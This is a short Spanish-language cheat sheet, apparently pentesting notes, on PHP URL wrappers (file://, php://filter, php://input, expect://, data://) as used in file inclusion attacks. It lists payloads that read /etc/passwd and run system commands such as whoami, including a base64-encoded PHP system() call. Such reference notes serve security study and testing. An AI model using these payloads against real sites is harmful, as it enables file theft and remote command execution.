> En **PHP**, los _wrappers_ de URL son **interfaces especiales que permiten acceder a distintos tipos de recursos usando una sintaxis similar a una URL dentro de funciones de archivos** (como `include`, `require`, `fopen`, `file_get_contents`, etc.). En lugar de abrir solo archivos del sistema, PHP puede interpretar esquemas como `file://`, `http://`, `ftp://` o `php://` para indicar **de dónde y cómo obtener los datos**.

## file://
- Para acceder a archivos locales de la maquina
`file:///etc/passwd`

## php://
- Aplica filtros como convertir a base 64 el archivo
`php://filter/convert.base64-encode/resource/=/etc/passwd`

- Rota 13 posiciones las letras (ROT13):
`php://filter/read=string.rot13/resource=/etc/passwd`

- Convierte caracteres de utf-8 a utf-16
`php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd`

- Para correr comando de sistema, pero debemos convertir la peticion en un POST
`php://input` - en la url
`<?php system('whoami'); ?>` - en el cuerpo
## expect://
- Permite inyectar comandos
`expect://whoami`

## data://
- para introducir codigo php en base64 y ejecutar comandos
`data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=` - esa ultima cadena es <?php system('whoami'); ?> en base64.

